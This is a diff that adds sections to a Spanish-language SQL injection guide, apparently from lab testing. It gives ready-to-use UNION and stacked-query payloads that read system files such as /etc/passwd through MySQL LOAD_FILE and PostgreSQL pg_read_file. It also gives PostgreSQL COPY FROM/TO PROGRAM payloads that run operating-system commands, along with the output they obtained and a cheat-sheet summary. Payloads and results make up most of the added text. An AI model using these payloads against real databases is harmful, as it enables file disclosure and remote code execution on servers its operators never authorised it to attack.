@@ -57,6 +57,30 @@ Usar técnica UNION SELECT con incremento de columnas hasta encontrar el número
 - **Tablas**: `users`, `products`
 - **Estructura users**: `id(int)`, `username(varchar)`, `password(varchar)`, `email(varchar)`, `created_at(datetime)`
 
+### 📁 Lectura de Archivos del Sistema - MySQL
+```sql
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 --
+```
+
+#### Técnica: LOAD_FILE()
+- **Función**: `LOAD_FILE(filename)`
+- **Ventaja**: Sin requisitos de casting
+- **Archivos leídos**: `/etc/passwd`, `/etc/hosts`
+- **Información obtenida**: 
+  - **Usuario MySQL**: `mysql:x:999:999::/var/lib/mysql:/bin/bash`
+  - **Sistema completo**: Todos los usuarios del sistema
+  - **Servicios**: daemon, bin, sys, adm, lp, sync, etc.
+
+#### Payload Exitoso:
+```sql
+-- Lectura directa sin casting
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 --
+
+-- Otros archivos importantes
+' UNION SELECT 1,LOAD_FILE('/etc/hosts'),3,4,5 --
+' UNION SELECT 1,LOAD_FILE('/var/log/mysql/error.log'),3,4,5 --
+```
+
 ---
 
 ## 🐘 POSTGRESQL ENUMERATION
@@ -87,6 +111,51 @@ Usar técnica UNION SELECT con incremento de columnas hasta encontrar el número
 - **Tablas**: `users`, `products`
 - **Características**: Soporte completo para stacked queries
 - **Nota**: Las tablas temporales no persisten entre consultas separadas
+
+### 🚨 Remote Code Execution (RCE)
+```sql
+'; DROP TABLE IF EXISTS temp_whoami; CREATE TEMP TABLE temp_whoami (content TEXT); COPY temp_whoami FROM PROGRAM 'whoami'; SELECT * FROM temp_whoami; --
+```
+
+#### Técnica RCE: COPY FROM PROGRAM
+- **Usuario PostgreSQL**: `postgres`
+- **Método**: Tabla temporal + COPY FROM PROGRAM
+- **Comando ejecutado**: `whoami`
+- **Resultado obtenido**: `postgres`
+
+#### Payload Explicado:
+1. **DROP TABLE IF EXISTS**: Elimina tabla temporal si existe
+2. **CREATE TEMP TABLE**: Crea tabla temporal para capturar output
+3. **COPY FROM PROGRAM**: Ejecuta comando del sistema operativo
+4. **SELECT**: Muestra el resultado del comando ejecutado
+
+#### Otros Comandos RCE Posibles:
+```sql
+-- Explorar sistema
+'; COPY (SELECT '') TO PROGRAM 'ls -la / > /tmp/files.txt'; --
+
+-- Información de procesos
+'; COPY (SELECT '') TO PROGRAM 'ps aux > /tmp/processes.txt'; --
+
+-- Información de red
+'; COPY (SELECT '') TO PROGRAM 'netstat -tulpn > /tmp/network.txt'; --
+```
+
+### 📁 Lectura de Archivos del Sistema
+```sql
+' UNION SELECT '999',pg_read_file('/etc/passwd'),'test','test','2025-01-01 00:00:00'::timestamp --
+```
+
+#### Técnica: pg_read_file()
+- **Función**: `pg_read_file(filename)`
+- **Requisito**: Casting explícito de tipos para UNION
+- **Archivos leídos**: `/etc/passwd`, `/etc/hosts`, `/etc/os-release`
+- **Limitación**: Requiere tipos exactos en UNION SELECT
+
+#### Archivos del Sistema Expuestos:
+- **SO**: Debian GNU/Linux 12 (bookworm)
+- **Usuarios**: root, daemon, bin, sys, mysql, postgres
+- **Información crítica**: Estructura del sistema operativo
 
 ---
 
@@ -174,11 +243,17 @@ Usar técnica UNION SELECT con incremento de columnas hasta encontrar el número
 - ✅ INFORMATION_SCHEMA estándar
 - ✅ Funciones de sistema integradas
 - ✅ UNION SELECT directo
+- 📁 **LOAD_FILE() para lectura de archivos**
+- 🔓 **Sin restricciones de casting**
 
 #### PostgreSQL
 - ✅ Stacked queries habilitadas
 - ✅ Casting explícito requerido (`::text`)
 - ✅ `pg_tables` para metadatos
+- 🚨 **COPY FROM PROGRAM para RCE**
+- 📁 **pg_read_file() para lectura de archivos**
+- ⚠️ **Funcionalidad peligrosa habilitada por defecto**
+- 🎯 **Casting de tipos crítico para UNION**
 
 #### SQL Server
 - ✅ INFORMATION_SCHEMA compatible
@@ -246,6 +321,24 @@ Usar técnica UNION SELECT con incremento de columnas hasta encontrar el número
 ' UNION SELECT 999,COLUMN_NAME,DATA_TYPE,'columns',SYSDATE FROM ALL_TAB_COLUMNS WHERE OWNER='ESQUEMA' AND TABLE_NAME='TABLA' -- 
 ```
 
+### Remote Code Execution (RCE)
+```sql
+-- PostgreSQL - COPY FROM PROGRAM
+'; DROP TABLE IF EXISTS temp_rce; CREATE TEMP TABLE temp_rce (output TEXT); COPY temp_rce FROM PROGRAM 'whoami'; SELECT * FROM temp_rce; --
+
+-- PostgreSQL - COPY TO PROGRAM (sin output visible)
+'; COPY (SELECT '') TO PROGRAM 'comando_del_sistema'; --
+```
+
+### Lectura de Archivos del Sistema
+```sql
+-- PostgreSQL - pg_read_file() (requiere casting)
+' UNION SELECT '999',pg_read_file('/etc/passwd'),'test','test','2025-01-01 00:00:00'::timestamp --
+
+-- MySQL - LOAD_FILE() (sin casting)
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 --
+```
+
 ---
 
 ## 🎯 Conclusiones
@@ -256,3 +349,4 @@ Esta guía demuestra la importancia del **descubrimiento empírico** en SQL inje
 
 ---
 *Documento generado el 3 de agosto de 2025 | Análisis de SQL Injection Multi-Motor*
+
